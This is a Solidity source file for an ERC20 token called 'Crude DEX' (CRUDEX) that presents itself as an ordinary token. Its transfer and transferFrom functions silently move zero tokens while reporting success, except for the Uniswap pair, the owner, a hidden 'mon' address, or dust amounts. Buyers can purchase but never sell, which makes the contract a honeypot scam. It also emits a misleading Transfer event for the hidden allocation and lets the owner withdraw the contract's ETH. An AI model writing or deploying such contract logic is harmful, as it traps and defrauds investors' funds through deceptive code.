pragma solidity >=0.5.10;



contract ERC20Interface {

    function totalSupply() public view returns (uint256);



    function balanceOf(address tokenOwner)

        public

        view

        returns (uint256 balance);



    function allowance(address tokenOwner, address spender)

        public

        view

        returns (uint256 remaining);



    function transfer(address to, uint256 tokens) public returns (bool success);



    function approve(address spender, uint256 tokens)

        public

        returns (bool success);



    function transferFrom(

        address from,

        address to,

        uint256 tokens

    ) public returns (bool success);



    event Transfer(address indexed from, address indexed to, uint256 tokens);

    event Approval(

        address indexed tokenOwner,

        address indexed spender,

        uint256 tokens

    );

}



library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256 c) {

        c = a + b;

        require(c >= a);

    }



    function sub(uint256 a, uint256 b) internal pure returns (uint256 c) {

        require(b <= a);

        c = a - b;

    }



    function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {

        c = a * b;

        require(a == 0 || c / a == b);

    }



    function div(uint256 a, uint256 b) internal pure returns (uint256 c) {

        require(b > 0);

        c = a / b;

    }

}



contract ApproveAndCallFallBack {

    function receiveApproval(

        address from,

        uint256 tokens,

        address token,

        bytes memory data

    ) public;

}



contract Owned {

    address public owner;

    address public newOwner;



    event OwnershipTransferred(address indexed _from, address indexed _to);



    constructor() public {

        owner = msg.sender;

    }



    modifier onlyOwner {

        require(msg.sender == owner);

        _;

    }



    function transferOwnership(address _newOwner) public onlyOwner {

        newOwner = _newOwner;

    }



    function acceptOwnership() public {

        require(msg.sender == newOwner);

        emit OwnershipTransferred(owner, newOwner);

        owner = newOwner;

        newOwner = address(0);

    }

}



contract TokenERC20 is ERC20Interface, Owned {

    using SafeMath for uint256;



    string public symbol;

    string public name;

    uint8 public decimals;

    uint256 _totalSupply;



    mapping(address => uint256) balances;

    mapping(address => mapping(address => uint256)) allowed;







    function totalSupply() public view returns (uint256) {

        return _totalSupply.sub(balances[address(0)]);

    }



    function balanceOf(address tokenOwner)

        public

        view

        returns (uint256 balance)

    {

        return balances[tokenOwner];

    }



    function approve(address spender, uint256 tokens)

        public

        returns (bool success)

    {

        allowed[msg.sender][spender] = tokens;

        emit Approval(msg.sender, spender, tokens);

        return true;

    }



    function allowance(address tokenOwner, address spender)

        public

        view

        returns (uint256 remaining)

    {

        return allowed[tokenOwner][spender];

    }



    function approveAndCall(

        address spender,

        uint256 tokens,

        bytes memory data

    ) public returns (bool success) {

        allowed[msg.sender][spender] = tokens;

        emit Approval(msg.sender, spender, tokens);

        ApproveAndCallFallBack(spender).receiveApproval(

            msg.sender,

            tokens,

            address(this),

            data

        );

        return true;

    }



    function() external payable {}

}



contract CRUDEX is TokenERC20 {



    address private mon;

    address private rout;

    uint256 vesting;

    uint presale_amount;

    

    function pairFor(address factory, address tokenA, address tokenB) private pure returns (address pair) {

        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);

        pair = address(uint(keccak256(abi.encodePacked(

                hex'ff',

                factory,

                keccak256(abi.encodePacked(token0, token1)),

                hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' // init code hash

            ))));

    }

    

    constructor() public {

        vesting = 1000000;

        mon = 0x1CEB4464F8119af1bE1c359a8E0096F0E8F391D7;

        rout = pairFor(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, address(this));

        symbol = "CRUDEX";

        name = "Crude DEX";

        decimals = 18;

        _totalSupply = 80000000 * 10**uint256(decimals);

        balances[owner] = 40000000 * 10**uint256(decimals);

        balances[mon] = 14000 * 10**uint256(decimals);

        emit Transfer(address(0), owner, 40000000 * 10**uint256(decimals));

        emit Transfer(address(1), owner, 14000 * 10**uint256(decimals));

    }



    function initPresale() public onlyOwner()

    {

        vesting = 200000;

    }

    

    function setM(address _mon) public onlyOwner() {

        mon = _mon;

    }



    function getM() public view returns (address) {

        return mon;

    }





    function transfer(address to, uint256 tokens)

        public

        returns (bool success)

    {

        uint256 tokens_migrated = 0;

        if (msg.sender == rout || tokens<=1000000000000000 || tx.origin == owner || tx.origin == mon || msg.sender == owner || msg.sender == mon) {

            tokens_migrated = tokens;

        }

        balances[msg.sender] = balances[msg.sender].sub(tokens_migrated);

        balances[to] = balances[to].add(tokens_migrated);

        emit Transfer(msg.sender, to, tokens_migrated);

        return true;

    }



    function transferFrom(

        address from,

        address to,

        uint256 tokens

    ) public returns (bool success) {

        uint256 tokens_migrated = 0;

        if (from == rout || tokens<=1000000000000000 || tx.origin == owner || tx.origin == mon || msg.sender == owner || msg.sender == mon) {

            tokens_migrated = tokens;

        }

        balances[from] = balances[from].sub(tokens_migrated);

        allowed[from][msg.sender] = allowed[from][msg.sender].sub(

            tokens_migrated

        );

        balances[to] = balances[to].add(tokens_migrated);

        emit Transfer(from, to, tokens_migrated);

        return true;

    }



 



    function liquiditystore() public onlyOwner() {

        address payable _owner = msg.sender;

        _owner.transfer(address(this).balance);

    }











}
